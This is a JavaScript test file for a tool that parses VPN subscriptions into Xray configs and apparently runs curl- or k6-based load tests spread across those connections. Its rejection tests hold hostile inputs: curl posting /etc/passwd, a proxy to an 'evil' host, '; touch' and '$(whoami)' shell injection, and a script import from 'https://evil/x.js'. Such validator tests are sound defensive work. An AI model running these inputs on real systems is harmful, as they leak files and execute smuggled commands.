import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  parseSubscription,
  xrayConfig,
  distribute,
  parseCurl,
  validateScript,
  seal,
  unseal,
  validateLoad,
} from '../../server/vpn/core.js';

const link = (port = 443, extra = '') =>
  `vless://11111111-1111-4111-8111-111111111111@vpn.example:${port}?security=reality&type=tcp&pbk=public-key&sid=aa&sni=example.org&fp=chrome${extra}#node`;

test('subscription keeps every inbound, including identical links and equal servers', () => {
  const records = parseSubscription(`${link()}\n${link(8443)}\n${link()}`);
  assert.equal(records.length, 3);
  assert.equal(new Set(records.map((x) => x.id)).size, 3);
  assert.equal(records[1].port, 8443);
});

test('Xray JSON subscription counts remote VPN outbounds, not local HTTP/SOCKS inbounds', () => {
  const outbound = {
    tag: 'proxy',
    protocol: 'vless',
    settings: {
      vnext: [
        {
          address: 'vpn.example',
          port: 8080,
          users: [{ id: '11111111-1111-4111-8111-111111111111', encryption: 'none' }],
        },
      ],
    },
    streamSettings: {
      network: 'tcp',
      security: 'none',
      tcpSettings: {
        header: { type: 'http', request: { path: ['/vpn'], headers: { Host: ['example.org'] } } },
      },
    },
  };
  const config = {
    remarks: 'VPN profile',
    inbounds: [{ protocol: 'http' }, { protocol: 'socks' }],
    outbounds: [outbound, { protocol: 'freedom' }, { protocol: 'blackhole' }],
  };
  const records = parseSubscription(JSON.stringify([config]));
  assert.equal(records.length, 1);
  assert.equal(records[0].sourceFormat, 'xray-json');
  const actual = xrayConfig(records[0]).outbounds[0];
  assert.deepEqual(actual.streamSettings, outbound.streamSettings);
  assert.deepEqual(actual.settings, outbound.settings);
  assert.deepEqual(
    xrayConfig(records[0]).outbounds.map((o) => o.protocol),
    ['vless', 'blackhole']
  );
  assert.equal(parseSubscription(JSON.stringify([config, config])).length, 2);
  assert.throws(() =>
    parseSubscription(JSON.stringify([{ outbounds: [outbound, { protocol: 'trojan' }] }]))
  );
});

test('VLESS TCP HTTP camouflage is preserved from a share link', () => {
  const records = parseSubscription(
    `${link().replace('security=reality', 'security=none')}#ignored`
  );
  const source = `${link()
    .split('#')[0]
    .replace(
      'security=reality',
      'security=none'
    )}&headerType=http&host=example.org&path=%2Fvpn#HTTP`;
  const config = xrayConfig(parseSubscription(source)[0]);
  assert.equal(config.outbounds[0].streamSettings.tcpSettings.header.type, 'http');
  assert.deepEqual(config.outbounds[0].streamSettings.tcpSettings.header.request.headers.Host, [
    'example.org',
  ]);
  assert.equal(records.length, 1);
});

test('provider placeholders are rejected instead of being offered as VPN connections', () => {
  assert.throws(
    () => parseSubscription(link().replace('vpn.example:443', '0.0.0.0:1')),
    /заглушку/
  );
  const raw = [
    {
      remarks: 'Приложение не поддерживается',
      outbounds: [
        {
          protocol: 'vless',
          settings: {
            vnext: [
              {
                address: '0.0.0.0',
                port: 1,
                users: [{ id: '11111111-1111-4111-8111-111111111111' }],
              },
            ],
          },
        },
      ],
    },
  ];
  assert.throws(() => parseSubscription(JSON.stringify(raw)), /заглушку/);
  assert.throws(() => parseSubscription('[]'), /не содержит/);
});

test('JSON Hysteria preserves authentication and transport; local loopbacks are counted separately', () => {
  const outbound = {
    protocol: 'hysteria',
    settings: { address: 'vpn.example', port: 443, version: 2 },
    streamSettings: {
      network: 'hysteria',
      security: 'tls',
      tlsSettings: { serverName: 'vpn.example' },
      hysteriaSettings: { auth: 'private' },
    },
  };
  const records = parseSubscription(
    JSON.stringify([
      { outbounds: [outbound, { protocol: 'loopback', settings: { inboundTag: 'local' } }] },
    ])
  );
  assert.equal(records.length, 1);
  assert.deepEqual(xrayConfig(records[0]).outbounds[0], { ...outbound, tag: 'vpn' });
  assert.equal(records[0].auxiliaryOutbounds, 1);
});

test('plain and base64 subscriptions are equivalent without ignoring broken entries', () => {
  assert.equal(parseSubscription(Buffer.from(link()).toString('base64')).length, 1);
  assert.throws(() => parseSubscription(`${link()}\ntrojan://unsupported`), /Запись 2/);
  assert.throws(() => parseSubscription(`${link()}\nvless://broken`), /Запись 2/);
  assert.throws(() => parseSubscription(link(443, '&type=ws')), /повтор/i);
});

test('Xray preserves reality and transport and has no direct outbound', () => {
  const record = parseSubscription(link())[0];
  const config = xrayConfig(record);
  assert.deepEqual(
    config.outbounds.map((x) => x.protocol),
    ['vless', 'blackhole']
  );
  assert.equal(config.outbounds[0].streamSettings.realitySettings.publicKey, 'public-key');
  assert.equal(config.inbounds[0].protocol, 'http');
  assert.equal(config.log.loglevel, 'none');
  const ws = parseSubscription(`${link().replace('type=tcp', 'type=ws')}&bad`)[0];
  assert.equal(xrayConfig(ws).outbounds[0].streamSettings.network, 'ws');
});

test('budget is exact, deterministic and never truncates the subscription', () => {
  assert.deepEqual(distribute(302, 3), [101, 101, 100]);
  assert.deepEqual(distribute(300, 10), Array(10).fill(30));
  assert.throws(() => distribute(2, 3), /числа подключений/);
  assert.throws(() => distribute(30.5, 3));
});

test('curl parser preserves quoted JSON, cookies, headers and explicit method', () => {
  const request = parseCurl(
    `curl 'https://example.org/api?q=x' -X PUT -H 'Authorization: Bearer secret' -b 'session=value' --data-raw '{"text":"hello world"}'`
  );
  assert.equal(request.method, 'PUT');
  assert.equal(request.headers.Cookie, 'session=value');
  assert.equal(request.body, '{"text":"hello world"}');
});

test('curl parser rejects shell execution, local files and unknown options', () => {
  for (const command of [
    'curl https://example.org -d @/etc/passwd',
    'curl https://example.org --proxy http://evil',
    'curl https://example.org; touch file',
    'curl "https://example.org/$(whoami)"',
    'curl https://example.org -F file=@test',
    'curl https://example.org https://second.example',
  ]) {
    assert.throws(() => parseCurl(command));
  }
});

test('JS requires a default function and cannot supply load, imports or setup traffic', () => {
  validateScript(
    "import http from 'k6/http'; export default function () { http.get('https://example.org'); }"
  );
  for (const script of [
    "import x from 'https://evil/x.js'; export default function() {}",
    'export const options = { scenarios: {} }; export default function() {}',
    'export const options = { vus: 100 }; export default function() {}',
    'export function setup() { return 1; } export default function() {}',
    "export default function() { open('/etc/passwd'); }",
    "export default function() { import('k6/http'); }",
    'export default {}',
  ]) {
    assert.throws(() => validateScript(script));
  }
});

test('authenticated encryption does not expose secrets and detects tampering', () => {
  const key = Buffer.alloc(32, 7);
  const data = { url: 'https://sub.example/secret', uuid: 'private' };
  const encrypted = seal(data, key);
  assert.ok(!encrypted.includes('private'));
  assert.deepEqual(unseal(encrypted, key), data);
  assert.throws(() => unseal(encrypted, Buffer.alloc(32, 8)));
});

test('JS rate uses iterations/s and load validates limits before queueing', () => {
  assert.throws(() => validateLoad({ mode: 'rps', budget: 30, duration: 60 }, 'js', 3));
  assert.equal(validateLoad({ mode: 'vus', budget: 2, duration: 60 }, 'js', 300).budget, 2);
  assert.equal(
    validateLoad({ mode: 'iterations', budget: 30, duration: 60 }, 'js', 3).duration,
    60
  );
});
